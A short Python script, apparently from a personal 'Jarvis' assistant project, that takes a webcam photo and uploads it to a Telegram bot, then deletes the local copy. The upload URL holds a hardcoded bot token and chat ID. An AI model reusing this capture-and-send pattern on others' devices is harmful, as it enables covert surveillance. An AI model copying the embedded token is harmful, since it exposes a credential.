import requests
from cv2 import *
import cv2
import pyautogui as pp
  
def run():
    # initialize the camera
# If you have multiple camera connected with 
# current device, assign a value in cam_port 
# variable according to that
   
    cam = cv2.VideoCapture(0) #cv2.CAP_DSHOW to remove warning
  
# reading the input using the camera
    result, image = cam.read()
  
# If image will detected without any error, 
# show result
    if result:
    # showing result, it take frame name and image 
    # output
        cv2.imshow("Ganesh", image)
  
    # saving image in local storage
        cv2.imwrite("Ganesh.png", image)
        photo="Ganesh.png"
  
    # If keyboard interrupt occurs, destroy image 
    # window
        pp.press('p',interval=2)
        cv2.waitKey(6) & 0xff
        cv2.destroyWindow("Ganesh")
        

  
# If captured image is corrupted, moving to else part
    else:
        print("No image detected. Please! try again")
        photo="G:\jarvis ready\1.png"
    k=open(photo,'rb')
    file =  {'photo':k}
    b=requests.post('https://api.telegram.org/bot5032770954:AAEq_ekucF6PG7aOMpF-cSrr_yj_rf1C-Bc/sendPhoto?chat_id=1354638378&caption=photo from Jarvis',files=file)
    k.close()
    import os
    os.remove("Ganesh.png")
    return b
run()
#                                                            Made by Ganesh For Project Jarvis 